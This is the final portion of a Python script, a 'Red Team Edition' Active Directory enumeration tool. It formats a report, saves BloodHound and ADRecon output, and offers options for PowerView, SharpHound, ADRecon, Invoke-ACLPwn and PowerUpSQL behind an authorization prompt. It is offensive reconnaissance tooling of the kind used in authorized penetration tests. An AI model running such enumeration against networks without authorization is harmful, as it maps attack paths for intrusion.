            f.write("-" * w + "\n")
            for group in self.results['groups']:
                f.write(f"  - {group}\n")
            f.write("\n\n")
            
            # Network Shares
            f.write("NETWORK SHARES:\n")
            f.write("-" * w + "\n")
            for share in self.results['shares']:
                f.write(f"\n{share['type'].upper()} SHARES:\n")
                f.write(str(share['data'])[:2000] + "\n")
            f.write("\n\n")
            
            # GPO
            f.write("GROUP POLICY OBJECTS:\n")
            f.write("-" * w + "\n")
            for gpo in self.results['gpo']:
                f.write(f"\n{gpo.get('scope', 'unknown').upper()} SCOPE:\n")
                f.write(str(gpo.get('data', ''))[:2000] + "\n")
            f.write("\n\n")
            
            # PowerView Results
            if self.config.powerview and self.results.get('powerview_data'):
                f.write("=" * w + "\n")
                f.write("                          POWERVIEW ENUMERATION RESULTS\n".center(w))
                f.write("=" * w + "\n\n")
                try:
                    pv_data = json.loads(self.results['powerview_data'])
                    f.write(json.dumps(pv_data, indent=2)[:10000])
                except:
                    f.write(str(self.results['powerview_data'])[:10000])
                f.write("\n\n")
            
            # SharpHound Results
            if self.config.sharphound and self.results.get('bloodhound_data'):
                f.write("=" * w + "\n")
                f.write("                        SHARPHOUND/BLOODHOUND RESULTS\n".center(w))
                f.write("=" * w + "\n\n")
                bh_data = self.results['bloodhound_data']
                f.write(f"BloodHound ZIP File: {bh_data.get('zip_file', 'N/A')}\n")
                f.write(f"Location: {bh_data.get('path', 'N/A')}\n")
                f.write(f"\nOutput:\n{str(bh_data.get('output', 'N/A'))[:2000]}\n")
                f.write("\n\n")
            
            # ADRecon Results
            if self.config.adrecon and self.results.get('adrecon_data'):
                f.write("=" * w + "\n")
                f.write("                           ADRECON RESULTS\n".center(w))
                f.write("=" * w + "\n\n")
                ad_data = self.results['adrecon_data']
                f.write(f"Output Directory: {ad_data.get('output_dir', 'N/A')}\n")
                f.write(f"\nOutput:\n{str(ad_data.get('output', 'N/A'))[:2000]}\n")
                f.write("\n\n")
            
            # ACLPwn Results
            if self.config.aclpwn and self.results.get('aclpwn_data'):
                f.write("=" * w + "\n")
                f.write("                           INVOKE-ACLPWN RESULTS\n".center(w))
                f.write("=" * w + "\n\n")
                try:
                    acl_data = json.loads(self.results['aclpwn_data'])
                    f.write(json.dumps(acl_data, indent=2)[:5000])
                except:
                    f.write(str(self.results['aclpwn_data'])[:5000])
                f.write("\n\n")
            
            # PowerUpSQL Results
            if self.config.powerupsql and self.results.get('powerupsql_data'):
                f.write("=" * w + "\n")
                f.write("                          POWERUPSQL RESULTS\n".center(w))
                f.write("=" * w + "\n\n")
                try:
                    sql_data = json.loads(self.results['powerupsql_data'])
                    f.write(json.dumps(sql_data, indent=2)[:5000])
                except:
                    f.write(str(self.results['powerupsql_data'])[:5000])
                f.write("\n\n")
            
            # Local System Information
            f.write("=" * w + "\n")
            f.write("                      LOCAL SYSTEM INFORMATION\n".center(w))
            f.write("=" * w + "\n\n")
            f.write("SYSTEM INFO:\n")
            f.write("-" * w + "\n")
            f.write(str(self.results['local_privileges'].get('systeminfo', 'N/A'))[:3000])
            f.write("\n\n")
            
            f.write("LOCAL USERS:\n")
            f.write("-" * w + "\n")
            f.write(str(self.results['local_privileges'].get('local_users', 'N/A'))[:2000])
            f.write("\n\n")
            
            f.write("LOCAL GROUPS:\n")
            f.write("-" * w + "\n")
            f.write(str(self.results['local_privileges'].get('local_groups', 'N/A'))[:2000])
            f.write("\n\n")
            
            # Footer
            end_time = datetime.now()
            start_time = datetime.fromisoformat(self.results['metadata']['start_time'])
            duration = (end_time - start_time).total_seconds()
            
            f.write("=" * w + "\n")
            f.write("                              END OF REPORT\n".center(w))
            f.write("=" * w + "\n")
            f.write(f"Report completed in {duration:.2f} seconds\n")
            f.write(f"Log file: {self.logger.log_file}\n")
            f.write("=" * w + "\n")
        
        self.logger.log(f"Report generated: {output_file}", status="SUCCESS")
        return output_file
    
    def cleanup(self):
        """Clean up temporary files"""
        try:
            if os.path.exists(self.temp_dir):
                # Copy important artifacts before cleanup
                if self.results.get('bloodhound_data', {}).get('zip_file'):
                    bh_zip = self.results['bloodhound_data']['path']
                    if os.path.exists(bh_zip):
                        shutil.copy(bh_zip, '.')
                        self.logger.log(f"BloodHound data saved: {os.path.basename(bh_zip)}", status="SUCCESS")
                
                if self.results.get('adrecon_data', {}).get('output_dir'):
                    adrecon_dir = self.results['adrecon_data']['output_dir']
                    if os.path.exists(adrecon_dir):
                        shutil.copytree(adrecon_dir, './ADRecon_Output', dirs_exist_ok=True)
                        self.logger.log("ADRecon data saved: ./ADRecon_Output", status="SUCCESS")
                
                # Clean temp directory
                shutil.rmtree(self.temp_dir)
                self.logger.log("Temporary files cleaned up", status="SUCCESS")
        except Exception as e:
            self.logger.log("Cleanup failed", error=str(e), status="WARN")
    
    def run_enumeration(self):
        """Main enumeration workflow with multi-threading"""
        print("\n" + "=" * 100)
        print("                    ADVANCED DOMAIN ENUMERATION TOOL - RED TEAM EDITION")
        print("=" * 100 + "\n")
        
        self.logger.log("Starting domain enumeration with multi-threading", status="INFO")
        
        print(f"[*] Configuration:")
        print(f"    - Threads: {self.config.threads}")
        print(f"    - PowerView: {'ENABLED' if self.config.powerview else 'DISABLED'}")
        print(f"    - SharpHound: {'ENABLED' if self.config.sharphound else 'DISABLED'}")
        print(f"    - ADRecon: {'ENABLED' if self.config.adrecon else 'DISABLED'}")
        print(f"    - Invoke-ACLPwn: {'ENABLED' if self.config.aclpwn else 'DISABLED'}")
        print(f"    - PowerUpSQL: {'ENABLED' if self.config.powerupsql else 'DISABLED'}")
        print()
        
        try:
            start_time = time.time()
            
            # Run parallel enumeration
            self.run_enumeration_parallel()
            
            # Generate report
            report_file = self.generate_report()
            
            end_time = time.time()
            duration = end_time - start_time
            
            # Cleanup
            self.cleanup()
            
            print("\n" + "=" * 100)
            print("Enumeration complete!")
            print("=" * 100)
            print(f"  Report:      {report_file}")
            print(f"  Log:         {self.logger.log_file}")
            if self.results.get('bloodhound_data', {}).get('zip_file'):
                print(f"  BloodHound:  {self.results['bloodhound_data']['zip_file']}")
            if self.results.get('adrecon_data', {}).get('output_dir'):
                print(f"  ADRecon:     ./ADRecon_Output")
            print(f"  Duration:    {duration:.2f} seconds")
            print(f"  Findings:    {len(self.results['weaknesses'])} total")
            print(f"               {len([f for f in self.results['weaknesses'] if f['severity'] == 'CRITICAL'])} critical")
            print("=" * 100 + "\n")
            
        except Exception as e:
            self.logger.log("Enumeration failed", error=str(e), status="ERROR")
            print(f"\n[ERROR] Enumeration failed: {e}")
            self.cleanup()

class Config:
    """Configuration class for command-line arguments"""
    def __init__(self):
        self.threads = 4
        self.powerview = True
        self.sharphound = True
        self.adrecon = True
        self.aclpwn = True
        self.powerupsql = True

def main():
    parser = argparse.ArgumentParser(
        description='Advanced Domain Enumeration Tool - Red Team Edition',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Run with all tools enabled (default)
  python domain_enum_tool.py
  
  # Run with specific tools
  python domain_enum_tool.py --powerview --sharphound
  
  # Disable specific tools
  python domain_enum_tool.py --no-adrecon --no-powerupsql
  
  # Set thread count
  python domain_enum_tool.py --threads 8
  
  # Minimal scan (basic enumeration only)
  python domain_enum_tool.py --no-powerview --no-sharphound --no-adrecon --no-aclpwn --no-powerupsql
        """
    )
    
    parser.add_argument('-t', '--threads', type=int, default=4,
                       help='Number of threads for parallel execution (default: 4)')
    
    parser.add_argument('--powerview', action='store_true', default=True,
                       help='Enable PowerView enumeration (default: enabled)')
    parser.add_argument('--no-powerview', dest='powerview', action='store_false',
                       help='Disable PowerView enumeration')
    
    parser.add_argument('--sharphound', action='store_true', default=True,
                       help='Enable SharpHound/BloodHound collection (default: enabled)')
    parser.add_argument('--no-sharphound', dest='sharphound', action='store_false',
                       help='Disable SharpHound/BloodHound collection')
    
    parser.add_argument('--adrecon', action='store_true', default=True,
                       help='Enable ADRecon enumeration (default: enabled)')
    parser.add_argument('--no-adrecon', dest='adrecon', action='store_false',
                       help='Disable ADRecon enumeration')
    
    parser.add_argument('--aclpwn', action='store_true', default=True,
                       help='Enable Invoke-ACLPwn enumeration (default: enabled)')
    parser.add_argument('--no-aclpwn', dest='aclpwn', action='store_false',
                       help='Disable Invoke-ACLPwn enumeration')
    
    parser.add_argument('--powerupsql', action='store_true', default=True,
                       help='Enable PowerUpSQL enumeration (default: enabled)')
    parser.add_argument('--no-powerupsql', dest='powerupsql', action='store_false',
                       help='Disable PowerUpSQL enumeration')
    
    parser.add_argument('--minimal', action='store_true',
                       help='Minimal scan - basic enumeration only, all tools disabled')
    
    args = parser.parse_args()
    
    # Create config
    config = Config()
    config.threads = args.threads
    
    if args.minimal:
        config.powerview = False
        config.sharphound = False
        config.adrecon = False
        config.aclpwn = False
        config.powerupsql = False
    else:
        config.powerview = args.powerview
        config.sharphound = args.sharphound
        config.adrecon = args.adrecon
        config.aclpwn = args.aclpwn
        config.powerupsql = args.powerupsql
    
    # Display banner
    print("""
    ╔══════════════════════════════════════════════════════════════════════════════════════╗
    ║              ADVANCED DOMAIN ENUMERATION TOOL - RED TEAM EDITION v2.0               ║
    ║                                                                                      ║
    ║  Integrated Tools: PowerView | SharpHound | ADRecon | Invoke-ACLPwn | PowerUpSQL   ║
    ║                                                                                      ║
    ║  WARNING: This tool is for authorized security assessments only                     ║
    ║  Unauthorized use may violate laws and regulations                                  ║
    ╚══════════════════════════════════════════════════════════════════════════════════════╝
    """)
    
    response = input("Are you authorized to run this enumeration? (yes/no): ")
    if response.lower() != 'yes':
        print("\n[!] Enumeration cancelled by user.")
        sys.exit(0)
    
    # Run enumeration
    enumerator = DomainEnumerator(config)
    enumerator.run_enumeration()

if __name__ == "__main__":
    main()
